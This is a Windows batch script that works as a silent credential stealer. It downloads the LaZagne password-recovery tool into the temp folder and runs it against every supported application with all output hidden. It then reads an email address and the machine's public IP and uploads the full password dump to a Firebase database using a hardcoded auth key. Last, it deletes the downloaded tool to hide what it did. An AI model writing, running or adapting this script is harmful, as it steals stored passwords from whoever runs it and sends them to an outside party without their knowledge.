@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

set "LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZAGNE_EXE=%TEMP%\LaZagne.exe"
set "OUTPUT_DIR=%TEMP%\Lazagne_Results"
set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials"
set "FIREBASE_KEY=fdM9pHfanpouiqsEmFLJUDAC2LtXF7rUBXbIPDA4"

if not exist "%LAZAGNE_EXE%" (
    powershell -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'"
    if errorlevel 1 exit /b 1
)

if not exist "%OUTPUT_DIR%" mkdir "%OUTPUT_DIR%"

"%LAZAGNE_EXE%" all -oN -output "%OUTPUT_DIR%" >nul 2>&1
if errorlevel 1 exit /b 1


for /f "delims=" %%F in ('dir /b /a-d /od "%OUTPUT_DIR%\*.txt" 2^>nul') do set "RESULT_FILE=%%F"
if not defined RESULT_FILE exit /b 1


set "PC_NAME=%COMPUTERNAME%"
set "PC_NAME=!PC_NAME: =_!"
set "PC_NAME=!PC_NAME:-=_!"


set "EMAIL=unknown"
for /f "tokens=* delims=" %%E in ('findstr /i /r "email=.*@.*" "%OUTPUT_DIR%\%RESULT_FILE%"') do (
    set "EMAIL_LINE=%%E"
    set "EMAIL_LINE=!EMAIL_LINE: =!"
    set "EMAIL=!EMAIL_LINE:*email==!"
)


powershell -Command ^
  "$ip = (Invoke-RestMethod -Uri 'https://api.ipify.org');" ^
  "$content = Get-Content -Raw -Path '%OUTPUT_DIR%\%RESULT_FILE%';" ^
  "$json = @{ computer = '%PC_NAME%'; email = '%EMAIL%'; timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss'); ip = $ip; data = $content } | ConvertTo-Json -Compress;" ^
  "Invoke-RestMethod -Uri '%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%' -Method PUT -Body $json -ContentType 'application/json'"

del /q "%LAZAGNE_EXE%" >nul 2>&1
exit /b 0
